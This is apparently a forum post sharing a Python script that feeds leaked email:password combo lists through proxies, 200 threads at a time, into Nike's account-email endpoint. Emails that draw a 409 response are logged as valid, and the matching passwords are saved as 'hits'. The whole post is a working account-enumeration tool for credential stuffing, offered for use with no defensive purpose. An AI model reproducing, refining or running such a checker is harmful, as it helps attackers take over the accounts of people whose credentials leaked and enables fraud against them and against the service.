LIKE OR GET BANNED FOR LEACHING
ASTROVM IS KING

WORKS UNTILL LIKE 200K LINES AND CRASHES

import threading
from colorama import Fore
from os import path
import time
import requests  

thread_count = 200
proxy = "http://IP:PORT"
print_lock = threading.Lock()
file_path = "FILE_PATH_TO_HITS"

total_checks = 0
start_time = time.time()

def print_output(message):
    with print_lock:
        print(message)

def write_to_file(email, passw, file_path): 
    try:
        with open(file_path, "a") as file:
            file.write(f"{email}:{passw}\n") 
    except FileNotFoundError:
        with open(file_path, "w") as file:
            file.write(f"{email}{passw}\n")  

def check_email(email):
    global total_checks

    url = 'https://unite.nike.com/account/email/v1?appVersion=880&experienceVersion=880&uxid=com.nike.commerce.omega.ios.2.111&locale=en_IL&backendEnvironment=identity&browser=Apple%20Computer%2C%20Inc.&os=undefined&mobile=true&native=true&visit=1&visitor=eacee72d-f3d3-4ef7-82cd-16772df2dea2'

    headers = {
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
        'pragma': 'no-cache',
        'accept': '*/*',
        'referer': 'https://unite.nike.com/s3/unite/mobile.html?iOSSDKVersion=4.0.1&clientId=0Zrbh9wN0CwjeczJAoKvc8US44Ogf49X&uxId=com.nike.commerce.omega.ios.2.111&view=none&locale=en_IL&backendEnvironment=identity&corsOverride=https://unite.nike.com&osVersion=14.4.2',
        'origin': 'https://unite.nike.com',
        'host': 'unite.nike.com',
        'X-Sec-Clge-Req-Type': 'ajax'
    }

    data = {
        'emailAddress': email
    }

    response = requests.post(url, headers=headers, json=data, proxies={'http': proxy, 'https': proxy})

    total_checks += 1
    elapsed_time = time.time() - start_time
    cpm = total_checks / (elapsed_time / 60)

    if response.status_code == 409:
        print_output(Fore.GREEN + f" [+] Valid Email -> {email} -> {cpm}")
        
        passw = passw_list[email_list.index(email)]
        write_to_file(email, passw, file_path)
    elif response.status_code == 204:
        pass
    else:
        pass

if __name__ == '__main__':
    num_threads = thread_count
    
    email_list = []
    passw_list = []  
    
    file_path1 = "FILE_PATH_TO_COMBOS"
    
    if (path.exists(file_path1) and path.getsize(file_path1) > 0):
        with open(file_path1, "r") as filestream:
            for line in filestream:
                acc_arg = line.strip().split(':')
                if len(acc_arg) >= 2:  
                    email = acc_arg[0]
                    passw = acc_arg[1]
                    email_list.append(email)
                    passw_list.append(passw)  
                else:
                    pass
        
        threads = []
        for email in email_list:
            thread = threading.Thread(target=check_email, args=(email,))
            threads.append(thread)
            thread.start()

            
            while threading.active_count() >= num_threads:
                time.sleep(0.1)

        for thread in threads:
            thread.join()
    else:
        print(Fore.RED + " [-] Account File Does Not Exist OR Has No Data.")